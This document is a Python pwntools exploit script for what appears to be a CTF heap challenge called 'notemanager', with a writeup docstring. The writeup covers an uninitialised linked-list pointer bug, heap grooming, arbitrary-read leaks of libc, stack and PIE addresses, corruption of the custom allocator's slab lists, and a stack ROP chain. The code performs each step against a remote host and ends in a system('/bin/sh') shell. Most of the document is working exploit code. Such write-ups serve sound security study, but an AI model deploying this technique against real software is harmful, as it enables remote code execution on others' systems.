#!/usr/bin/env python3

'''
Writeup:

This challenge uses the same custom heap implementation as the 'babyheap'
challenge from the gacha category. This time however, we must use the
allocator itself to achieve primitives and achieve RCE.

Whie babyheap stored notes in an array, this challenge changes the Note
struct so that notes are now stored in a linked list. The bug is that 
when a new Note is created, its `next` field is left uninitialised.

This provides us with some interesting possible initial primitives:
We could free a Note in the middle of a list, then re-claim its allocation,
making our new note point back to some existing note (creating a loop).
We could free a Note, and the note it points to, then reclaim the pointed
to note with text, and the first note with another note. This gives us a way to 
cleanly link a 'fake note' with a controlled body into the list in a reusable
fashion. 

Importantly, text writing in this challenge gives us flexibility: we can specify arbitrary note data size, while only partially filling the allocated buffer.  


Initial Leak:
We can obtain an initial leak of a babyheap slab with the following steps:

1. Allocate N notes (eg 13) with note sized text.
2. Create 2 notes with a non note-sized data
3. The last two notes, oldest first.
4. Create a new Note with Note sized text. The Note body will reclaim the 
   old note that had `next` pointing to the other freed note. The note text will
   reclaim _the other freed note_. This means we now have a note with text _and_
   next that point to a single note object. For actual next, if we make it a 
   single null byte, then along with a terminating null byte, 2 null bytes will
   be written into the body of this chunk. Since memory is not zeroed on 
   allocation, this will effectively align data at this location to 0x10000.
5. Aligning the memory this way points us to a slab header. Since the chunk
   can also be used as a Note, we 'read' this Note, and its title will leak
   us the magic bytes of a slab. This can be used to trivially recover the 
   slab's own address.

Arbitrary Read:

This technique can be further developed into a re-usable read primitve.
After our initial read, we need to be careful about creating loops in the 
Note list. We currently have a note that points to a single chunk twice, as 
both a Note and Note text. If we delete this Note, its text chunk will also 
be freed, but the Note view of that same chunk will stay linked into the Note
list (despite being freed). If we add a chunk again, we have to be careful
to reset the chain before adding again, otherwise we will loop forever.

By deleting the chunk, then re-adding it, we can give it a structure like:

    0x0: target
    0x8: target
    0x10: null

This will create a fake chunk in our list that points wherever we like
(allowing us to read arbitrarily) but also has a `next` of null, effectively
dropping reference to our newest chunk, but ensuring that we do not create
a loop. 

This pattern is repeatable, so we use it to derive all our leaks:

babyheap slabs are MMAP'd which means they should be at somewhat
guessable offsets from libc. Guess some offsets and test that we 
found an elf header.

Then: libc -> environ for stack , stack->scan for bin pointers to break PIE.


Writing and RCE:

Achieving a write primitive is more difficult, and requires us to take
advantage of the allocator's internal behaviour.

The uninitialised next bug gives us a constrained pointer writing primitive:
By pointing a fake Note's `next` field a target, then so long as 
target + 0x10 is null, adding a new Note will cause a newly allocated Note's 
address to be written that location. We use this to make a chunk with:

    next = slab_lists[CLASS_256] - 0x10

Because the 256 size class has not been used yet, slab_lists[4] == null.
This means that the next Note we allocate will have its address written into
the slab list at this index, treating a newly allocated note as a region_header.
The new note will have `next` == 0. This overlaps with region_header.free_chunks
which means that this fake slab counts as being full. As such, the fake 
region_header's `next` field will be followed. We control this field in the text
of our allocated note, so we can point this `next` region anywhere. We point 
this to the note's own title, in which we can forge another region_header,
controlling `data_off` to point to where we would like to write. 

At this point we can write anywhere, but we have a problem: In the current 
configuration, the note list has a loop. Therefore, we will use our first write 
to target the current note's body, redirecting the confused 'region_header', 
and clearing the note's `next` pointer.

A trick: we want to write to the stack ultimately. To do this we can use the 
aforementioned write to point the region_header chain to the stack buffer
of the `read_number` function. Then, Our final move is to send:
    '255\0 <fake region_header>'
with a region header that positions `data_off` at the correct position to write 
our ROP chain at the correct position such that when `create_note` completes, 
our ROP chain executes

'''

import sys
from pathlib import Path

from pwn import *


e = ELF("./notemanager", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = e

host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 1337
p = remote(host, port)


sla = lambda delim, data: p.sendlineafter(delim, data)

add = lambda title, length, text: (
    sla(b"> ", b"1"),
    sla(b"Note title: ", title),
    sla(b"Note length: ", str(length).encode()),
    sla(b"Note text: ", text),
)
delete = lambda idx: (
    sla(b"> ", b"3"),
    sla(b"Note to delete: ", str(idx).encode()),
)


TEXT32 = 31
REGION_MAGIC = 0xBABE12345678C0DE

for i in range(13):
    add(f"groom-{i}".encode(), TEXT32, b"G" * TEXT32)

add(b"old-A", 100, b"A")
add(b"old-B", 100, b"B")
delete(13)
delete(13)
add(b"dangling-owner", TEXT32, b"\0")
add(b"index-shift", 100, b"E")

sla(b"> ", b"2")
sla(b"Note to display: ", b"14")
p.recvuntil(b"TITLE: ")
header = p.recvuntil(b"\n================================\n", drop=True)
p.recvuntil(b"\n1. New note\n")
title_slab = u64(header[:8]) ^ REGION_MAGIC
delete(13)

log.info("title slab:       %#x", title_slab)

libc_base = 0
for gap in range(0x43000, 0x33000, -0x1000):
    address = title_slab + gap
    fields = flat(address, address, 0)
    add(b"reader", TEXT32, fields)

    sla(b"> ", b"2")
    sla(b"Note to display: ", b"13")
    p.recvuntil(b"TITLE: ")
    leaked = p.recvuntil(b"\n================================\n", drop=True)
    p.recvuntil(b"\n1. New note\n")
    delete(14)

    if leaked.startswith(b"\x7fELF"):
        libc_base = address
        break

libc.address = libc_base

environ = 0
for shift in range(3):
    address = libc.sym["environ"] + shift
    fields = flat(address, address, 0)
    add(b"reader", TEXT32, fields)

    sla(b"> ", b"2")
    sla(b"Note to display: ", b"13")
    p.recvuntil(b"TITLE: ")
    leaked = p.recvuntil(b"\n================================\n", drop=True)
    p.recvuntil(b"\n1. New note\n")
    delete(14)

    if leaked:
        environ = u64((b"\0" * shift + leaked[: 8 - shift]).ljust(8, b"\0"))
        break


address = environ + 0x60
fields = flat(address, address, 0)
add(b"reader", TEXT32, fields)

sla(b"> ", b"2")
sla(b"Note to display: ", b"13")
p.recvuntil(b"TITLE: ")
leaked = p.recvuntil(b"\n================================\n", drop=True)
p.recvuntil(b"\n1. New note\n")
delete(14)

e.address = u64(leaked[:8].ljust(8, b"\0")) - int(e.header.e_phoff)

address = e.sym["note_store_head"]
fields = flat(address, address, 0)
add(b"reader", TEXT32, fields)

sla(b"> ", b"2")
sla(b"Note to display: ", b"13")
p.recvuntil(b"TITLE: ")
leaked = p.recvuntil(b"\n================================\n", drop=True)
p.recvuntil(b"\n1. New note\n")
delete(14)

c0 = u64(leaked[:8].ljust(8, b"\0"))

c26 = c0 + 26 * 32
c27 = c0 + 27 * 32
title13 = title_slab + 0xb0 + 13 * 64
class_256_head = e.sym["slab_lists"] + 4 * 8
stack_number_buffer = environ - 0x220
stack_return = stack_number_buffer + 0x98

log.info("libc base:        %#x", libc.address)
log.info("PIE base:         %#x", e.address)
log.info("class-32 chunk 0: %#x", c0)
log.info("stack fake slab:  %#x", stack_number_buffer)

data_off = c27 + 8 - title13

heap_header = bytearray(32)
heap_header[20:24] = p32(1)
heap_header[24:28] = p32(1)
heap_header[28:32] = p32(data_off)
fake_note = flat(title_slab, title13, class_256_head - 16)
add(bytes(heap_header), TEXT32, fake_note)

redirect = flat(stack_number_buffer, 0)
add(b"redirect", 255, redirect)
delete(11)

stack_header = bytearray(32)
stack_header[:4] = b"255\0"
stack_header[20:24] = p32(1)
stack_header[24:28] = p32(1)
stack_header[28:32] = p32(0x98)

command = b"/bin/sh\x00"
rop = ROP(libc)
chain = flat(
    rop.find_gadget(["ret"]).address,
    rop.find_gadget(["pop rdi", "ret"]).address,
    stack_return + 5 * context.bytes,
    libc.sym["system"],
    libc.sym["_exit"],
) + command

sla(b"> ", b"1")
sla(b"Note title: ", b"final")
sla(b"Note length: ", bytes(stack_header[:31]))
sla(b"Note text: ", chain)

p.interactive()
